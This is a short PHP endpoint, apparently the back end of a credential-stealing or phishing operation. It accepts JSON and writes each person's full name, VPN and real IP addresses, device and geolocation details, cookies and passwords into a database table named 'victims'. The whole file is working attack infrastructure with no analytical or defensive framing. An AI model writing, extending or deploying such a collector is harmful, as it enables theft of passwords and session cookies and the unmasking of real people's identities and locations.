<?php
include 'db_connect.php';

$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

if ($data === null) {
    http_response_code(400);
    echo "Ошибка: Неверный формат данных JSON";
    exit;
}

$id = $data['id'];
$fullName = isset($data['fullName']) ? $data['fullName'] : '';
$vpnIP = isset($data['vpnIP']) ? $data['vpnIP'] : '';
$realIP = isset($data['realIP']) ? $data['realIP'] : '';
$deviceInfo = isset($data['deviceInfo']) ? $data['deviceInfo'] : '';
$geoInfo = isset($data['geoInfo']) ? $data['geoInfo'] : '';
$cookies = isset($data['cookies']) ? $data['cookies'] : '';
$passwords = isset($data['passwords']) ? $data['passwords'] : '';
$timestamp = date('Y-m-d H:i:s');

$sql = "UPDATE victims SET fullName = ?, vpnIP = ?, realIP = ?, deviceInfo = ?, geoInfo = ?, cookies = ?, passwords = ?, timestamp = ? WHERE id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssssssssi", $fullName, $vpnIP, $realIP, $deviceInfo, $geoInfo, $cookies, $passwords, $timestamp, $id);

if ($stmt->execute()) {
    http_response_code(200);
    echo "Record updated successfully";
} else {
    http_response_code(500);
    echo "Error updating record: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>